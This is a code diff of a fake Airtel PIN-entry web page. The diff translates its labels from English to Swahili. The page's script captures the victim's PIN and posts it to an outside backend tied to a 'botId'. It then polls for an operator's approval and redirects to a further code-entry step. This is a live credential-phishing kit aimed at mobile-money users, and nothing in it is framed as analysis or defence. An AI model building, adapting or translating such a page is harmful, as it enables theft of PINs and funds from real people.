@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Enter PIN</title>
+<title>Ingiza PIN</title>
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -97,11 +97,11 @@ button.enabled {
 
 <div class="pin-container">
     <h1>Airtel</h1>
-    <h2>Welcome</h2>
+    <h2>Karibu</h2>
 
     <input id="phoneDisplay" type="text" readonly>
 
-    <p>Enter your PIN</p>
+    <p>Ingiza PIN yako</p>
     <form id="pinForm">
         <div class="pin-boxes">
             <input type="tel" maxlength="1" inputmode="numeric">
@@ -109,10 +109,10 @@ button.enabled {
             <input type="tel" maxlength="1" inputmode="numeric">
             <input type="tel" maxlength="1" inputmode="numeric">
         </div>
-        <button id="submitBtn" disabled>Login</button>
+        <button id="submitBtn" disabled>Ingia</button>
     </form>
 
-    <p class="terms">By continuing, you agree to the Terms and Conditions</p>
+    <p class="terms">Kwa kuendelea, unakubali Sheria na Masharti</p>
     <div class="status" id="status"></div>
 </div>
 
@@ -123,7 +123,7 @@ const BACKEND_URL = "https://zanaco-backend.onrender.com";
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId');
 if (!botId) {
-    alert("Invalid access link");
+    alert("Kiungo batili cha ufikiaji");
     throw new Error("botId missing");
 }
 
@@ -165,7 +165,7 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
     localStorage.setItem('pin', pin);
 
     button.disabled = true;
-    button.textContent = 'Logging in...';
+    button.textContent = 'Inaingia...';
 
     const res = await fetch(`${BACKEND_URL}/submit-pin`, {
         method: 'POST',
@@ -180,37 +180,30 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
 
     const { requestId } = await res.json();
 
+    // ---------------- POLLING FOR APPROVAL ----------------
     const poll = setInterval(async () => {
         const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
         const d = await r.json();
 
-        // ---------------- BLOCK ----------------
         if (d.blocked) {
-            statusDiv.textContent = d.message || "Enter a valid prepaid number";
+            statusDiv.textContent = d.message || "Ingiza nambari halali ya prepaid";
             button.disabled = false;
-            button.textContent = 'Login';
+            button.textContent = 'Ingia';
             [...inputs].forEach(i => i.value = '');
             clearInterval(poll);
             return;
         }
 
-        // ---------------- PIN APPROVED ----------------
         if (d.approved === true) {
             clearInterval(poll);
-            // If code was already approved earlier, go to success
-            if (d.codeAlreadyApproved) {
-                window.location.href = `success.html?botId=${botId}`;
-            } else {
-                window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
-            }
+            window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
             return;
         }
 
-        // ---------------- PIN REJECTED ----------------
         if (d.approved === false) {
-            statusDiv.textContent = "Incorrect PIN. Enter again.";
+            statusDiv.textContent = "PIN si sahihi. Ingiza tena.";
             button.disabled = false;
-            button.textContent = 'Login';
+            button.textContent = 'Ingia';
             [...inputs].forEach(i => i.value = '');
         }
     }, 1500);
